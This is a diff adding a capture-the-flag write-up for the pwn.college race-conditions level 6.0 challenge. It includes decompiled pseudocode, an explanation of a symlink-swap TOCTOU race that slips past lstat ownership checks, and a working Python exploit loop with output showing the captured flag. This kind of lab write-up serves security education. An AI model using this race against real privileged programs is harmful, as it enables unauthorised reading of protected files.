@@ -1811,3 +1811,273 @@ pwn.college{wkT7O7pbJKlOX374m8BlRXBVvaW.0FMxQDL4ITM0EzW}
 
 &nbsp;
 
+## level6.0
+
+> Exploit a complex race condition to read the flag. This race condition involves multiple steps, which makes it less reliable to exploit!
+
+```text
+hacker@race-conditions~level6-0:~$ /challenge/babyrace_level6.0
+###
+### Welcome to /challenge/babyrace_level6.0!
+###
+
+Through this series of challenges, you will become familiar with the concept of race conditions. This challenge allows
+you to open a single file, as specified by the first argument to the program (argv[1]).
+
+The file opened will be be sent to you.
+
+This challenge will verify that the file's path does not include "flag".
+This challenge will verify that the file is not a symlink.
+This challenge will verify that the directory the file is in is owned by root
+and that other users are not able to create files in that directory.
+babyrace_level6.0: <stdin>:76: main: Assertion `argc > 1' failed.
+Aborted
+```
+
+The program performs four checks before opening the file:
+
+1. The path must not contain the string `"flag"`.
+2. The file at that path must not be a symlink (`lstat` → `S_ISLNK`).
+3. The directory containing the file must be owned by root (`lstat` → `st_uid == 0`).
+4. The directory must not be group owned by non-root and must not be world-writable (`st_gid == 0`, `st_mode & 2 == 0`).
+
+### Source code analysis
+
+```c title="/challenge/babyrace_level6.0 :: main() :: Pseudocode" showLineNumbers
+int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  char *v3; // rax
+  char *v4; // rax
+  int v5; // eax
+  size_t v6; // rax
+  struct stat stat_buf; // [rsp+20h] [rbp-1A0h] BYREF
+  char buf[264]; // [rsp+B0h] [rbp-110h] BYREF
+  unsigned __int64 v10; // [rsp+1B8h] [rbp-8h]
+
+  v10 = __readfsqword(0x28u);
+  setvbuf(stdin, 0LL, 2, 0LL);
+  setvbuf(_bss_start, 0LL, 2, 0LL);
+  puts("###");
+  printf("### Welcome to %s!\n", *argv);
+  puts("###");
+  putchar(10);
+  puts(
+    "Through this series of challenges, you will become familiar with the concept of race conditions. This challenge allows");
+  puts("you to open a single file, as specified by the first argument to the program (argv[1]).\n");
+  puts("The file opened will be be sent to you.\n");
+  puts("This challenge will verify that the file's path does not include \"flag\".");
+  puts("This challenge will verify that the file is not a symlink.");
+  puts("This challenge will verify that the directory the file is in is owned by root");
+  puts("and that other users are not able to create files in that directory.");
+  if ( argc <= 1 )
+    __assert_fail("argc > 1", "<stdin>", 0x31u, "main");
+  if ( strstr(argv[1], "flag") )
+  {
+    puts("Error: path contains `flag`!");
+    exit(1);
+  }
+  puts("Calling lstat (does not follow symlinks) on the path.\n");
+  puts("Paused (press enter to continue)");
+  getchar();
+  if ( (unsigned int)lstat((char *)argv[1], &stat_buf) == -1 )
+  {
+    puts("Error: failed to get file status!");
+    exit(1);
+  }
+  if ( (stat_buf.st_mode & 0xF000) == 40960 )
+  {
+    puts("Error: file is a symlink!");
+    exit(1);
+  }
+  puts("Calling lstat (does not follow symlinks) on the directory.\n");
+  puts("Paused (press enter to continue)");
+  getchar();
+  v3 = strdup(argv[1]);
+  v4 = dirname(v3);
+  if ( (unsigned int)lstat(v4, &stat_buf) == -1 )
+  {
+    puts("Error: failed to get directory status!");
+    exit(1);
+  }
+  if ( stat_buf.st_uid )
+  {
+    puts("Error: directory not owned by root!");
+    exit(1);
+  }
+  if ( stat_buf.st_gid )
+  {
+    puts("Error: directory not group owned by root!");
+    exit(1);
+  }
+  if ( (stat_buf.st_mode & 2) != 0 )
+  {
+    puts("Error: other users are able to write in this directory!");
+    exit(1);
+  }
+  puts("Paused (press enter to continue)");
+  getchar();
+  v5 = open(argv[1], 0);
+  v6 = read(v5, buf, 0x100uLL);
+  write(1, buf, v6);
+  puts("### Goodbye!");
+  return 0;
+}
+```
+
+This is identical to [level5.0](#level50) with one critical difference: the directory check now uses **`lstat`** instead of `stat`. This means it **does not follow symlinks** on the directory component.
+
+In level5.0 the `pivot -> /etc` trick worked because `stat` followed `pivot` through to `/etc` and checked its metadata. With `lstat`, calling it on `"pivot"` stops at the symlink itself — returning our uid, not root's — so the ownership check fails.
+
+The solution is to construct a path where `dirname` resolves to something whose **final component is a real root-owned directory**, not a symlink. `lstat` follows all intermediate components freely, only stopping at the final one.
+
+Using the path `pivot/challenge/babyrace_level6.0`:
+
+- `dirname("pivot/challenge/babyrace_level6.0")` = `"pivot/challenge"`
+- `lstat("pivot/challenge")` — `pivot` is an intermediate component so it is followed, `challenge` is the final component — checks `/challenge` itself, which is a real root-owned directory ✓
+
+So when `pivot` → `/`:
+- `lstat("pivot/challenge/babyrace_level6.0")` = `lstat("/challenge/babyrace_level6.0")` = real file ✓
+- `lstat("pivot/challenge")` = `lstat("/challenge")` = root-owned, no world-write ✓
+
+Then swap `pivot` → `./evil` before `open()`:
+- `open("pivot/challenge/babyrace_level6.0")` = `open("evil/challenge/babyrace_level6.0")` = symlink → `/flag` ✓
+
+```text
+Pause 1: pivot -> /
+         lstat("pivot/challenge/babyrace_level6.0") = /challenge/babyrace_level6.0
+         real binary file, not a symlink ✓
+
+Pause 2: pivot -> /
+         lstat(dirname) = lstat("pivot/challenge") = lstat("/challenge")
+         root-owned, no world-write ✓
+
+Pause 3: pivot -> ./evil
+         open("pivot/challenge/babyrace_level6.0")
+         = evil/challenge/babyrace_level6.0 -> /flag ✓
+```
+
+### Exploit
+
+```python title="~/script.py" showLineNumbers
+import subprocess, os, warnings, time
+warnings.filterwarnings("ignore")
+
+# cleanup
+for x in ["pivot", "evil"]:
+    try:
+        if os.path.islink(x): os.unlink(x)
+        elif os.path.isdir(x): os.rmdir(x)
+    except: pass
+
+# evil/challenge/babyrace_level6.0 -> /flag
+os.makedirs("evil/challenge", exist_ok=True)
+try: os.unlink("evil/challenge/babyrace_level6.0")
+except: pass
+os.symlink("/flag", "evil/challenge/babyrace_level6.0")
+
+TARGET = "/challenge/babyrace_level6.0"
+print("[*] Starting exploit loop...")
+attempt = 0
+proc = None
+
+while True:
+    attempt += 1
+
+    # Cleanup previous process
+    if proc is not None:
+        try: proc.stdin.close()
+        except: pass
+        try: proc.stdout.close()
+        except: pass
+        try: proc.kill()
+        except: pass
+        try: proc.wait()
+        except: pass
+        proc = None
+
+    # Reset pivot -> /
+    try: os.unlink("pivot")
+    except: pass
+    os.symlink("/", "pivot")
+
+    proc = subprocess.Popen(
+        [TARGET, "pivot/challenge/babyrace_level6.0"],
+        stdin=subprocess.PIPE,
+        stdout=subprocess.PIPE,
+        stderr=subprocess.STDOUT,
+        close_fds=True
+    )
+
+    # Pause 1: lstat sees /challenge/babyrace_level6.0 = real file ✓
+    time.sleep(0.1)
+    try:
+        proc.stdin.write(b"\n")
+        proc.stdin.flush()
+    except Exception:
+        continue
+
+    # Pause 2: lstat(dirname) = lstat("pivot/challenge") = lstat("/challenge") = root-owned ✓
+    time.sleep(0.05)
+    try:
+        proc.stdin.write(b"\n")
+        proc.stdin.flush()
+    except Exception:
+        continue
+
+    # Swap pivot -> evil before open()
+    try: os.unlink("pivot")
+    except: pass
+    os.symlink("./evil", "pivot")
+
+    # Pause 3: open("pivot/challenge/babyrace_level6.0") -> evil/challenge/babyrace_level6.0 -> /flag
+    time.sleep(0.05)
+    try:
+        proc.stdin.write(b"\n")
+        proc.stdin.flush()
+        proc.stdin.close()
+    except Exception:
+        continue
+
+    out = proc.stdout.read()
+    proc.wait()
+    proc = None
+
+    if attempt % 10 == 0:
+        print(f"[*] Attempt {attempt}...")
+
+    if b"pwn.college" in out:
+        print("[+] Got the flag!")
+        print(out.decode(errors='replace'))
+        break
+```
+
+```text
+hacker@race-conditions~level6-0:~$ python ~/script.py
+[*] Starting exploit loop...
+[+] Got the flag!
+###
+### Welcome to /challenge/babyrace_level6.0!
+###
+
+Through this series of challenges, you will become familiar with the concept of race conditions. This challenge allows
+you to open a single file, as specified by the first argument to the program (argv[1]).
+
+The file opened will be be sent to you.
+
+This challenge will verify that the file's path does not include "flag".
+This challenge will verify that the file is not a symlink.
+This challenge will verify that the directory the file is in is owned by root
+and that other users are not able to create files in that directory.
+Calling lstat (does not follow symlinks) on the path.
+
+Paused (press enter to continue)
+Calling lstat (does not follow symlinks) on the directory.
+
+Paused (press enter to continue)
+Paused (press enter to continue)
+pwn.college{c6bBmyZdAsYHSdVjp1vh-buv2hM.0VMxQDL4ITM0EzW}
+### Goodbye!
+```
+
+&nbsp;
+
